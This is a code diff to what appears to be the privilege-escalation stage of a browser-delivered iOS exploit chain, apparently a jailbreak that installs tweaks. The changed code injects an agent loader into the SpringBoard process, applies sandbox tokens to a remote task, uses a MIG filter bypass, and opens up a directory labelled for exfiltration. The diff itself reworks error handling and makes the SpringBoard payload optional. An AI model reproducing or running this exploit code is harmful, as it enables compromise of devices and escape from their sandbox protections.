@@ -8459,11 +8459,12 @@ const ENABLE_CORUNA_TWEAKLOADER = false;
 // Tweak enable flags are driven by globalThis values prepended to pe_main.js by
 // sbx1_main.js's spawn_pe(). This lets index.html pick which tweaks to install
 // in a single chain run. index.html can select any subset; each flag drives an
-// independent payload injection. Defaults to fiveicon if no tweak flags are
-// specified (e.g. when pe_main.js is run standalone without the sbx1 prelude).
-const ENABLE_SPRINGBOARD_JS_TWEAK = (typeof globalThis.__ls_enable_fiveicon === 'undefined' && typeof globalThis.__ls_enable_powercuff === 'undefined' && typeof globalThis.__ls_enable_threeapp === 'undefined') ? true : !!globalThis.__ls_enable_fiveicon;
+// independent payload injection. Missing flags mean no SpringBoard payload;
+// the SpringBoard RemoteCall path is the least stable piece on reruns.
+const ENABLE_SPRINGBOARD_JS_TWEAK = !!globalThis.__ls_enable_fiveicon;
 const SPRINGBOARD_JS_TWEAK_PATH = "/sbcustomizer_light.js";
 const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
+const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
@@ -9163,32 +9164,58 @@ function start() { LOG("[+] PE start() called");
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
 
-	LOG("[PE] Creating agent loader for " + targetProcess); let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
-	let agentPid = 0;
-	try {
-		if (agentLoader.inject()) { LOG("[+] Agent loader injected");
-			agentPid = agentLoader.task.pid();
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
-			if (ENABLE_CORUNA_TWEAKLOADER)
-				injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
-			else
-				LOG("[PE] Coruna tweakloader disabled");
-			let springboardTweakInjected = false;
-			if (ENABLE_SPRINGBOARD_JS_TWEAK)
-				springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
-			else
-				LOG("[PE] SpringBoard JS tweak disabled");
-			if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
-				LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
-				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
-			}
+	runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 
-		} else {
-			LOG("[PE] Agent loader inject failed");
+	let agentPid = 0;
+	if (ENABLE_SPRINGBOARD_AGENT) {
+		let agentLoader = null;
+		try {
+			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK);
+			LOG("[PE] Creating agent loader for " + targetProcess);
+			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
+			LOG("[PE] Agent loader created, calling inject()...");
+			let agentInjected = agentLoader.inject();
+			LOG("[PE] Agent loader inject result: " + agentInjected);
+			if (agentInjected) {
+				LOG("[+] Agent loader injected");
+				agentPid = agentLoader.task.pid();
+				LOG("[PE] Agent loader pid=" + agentPid + "; applying sandbox tokens");
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
+				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
+				if (ENABLE_CORUNA_TWEAKLOADER)
+					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Coruna tweakloader disabled");
+				let springboardTweakInjected = false;
+				if (ENABLE_SPRINGBOARD_JS_TWEAK)
+					springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
+				else
+					LOG("[PE] SpringBoard JS tweak disabled");
+				if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
+					LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
+					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
+				}
+
+			} else {
+				LOG("[PE] Agent loader inject failed");
+			}
+		} catch (agentErr) {
+			LOG("[PE] Agent loader exception: " + String(agentErr));
+			LOG("[PE] Agent loader stack: " + (agentErr.stack || "no stack"));
+		} finally {
+			if (agentLoader) {
+				LOG("[PE] Destroying agent loader");
+				try {
+					agentLoader.destroy();
+					LOG("[PE] Agent loader destroyed");
+				} catch (destroyErr) {
+					LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
+				}
+			}
 		}
-	} finally {
-		agentLoader.destroy();
+	} else {
+		LOG("[PE] SpringBoard agent loader skipped (no SpringBoard payload enabled)");
 	}
 
 		if (ENABLE_POWERCUFF_TWEAK)
@@ -9800,7 +9827,6 @@ function start() { LOG("[+] PE start() called");
 		LOG("[THREEAPP] 3-App Bypass disabled");
 	}
 
-	runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 	} finally {
 		LOG("[PE] Cleaning up launchdTask...");
 		launchdTask.destroy();
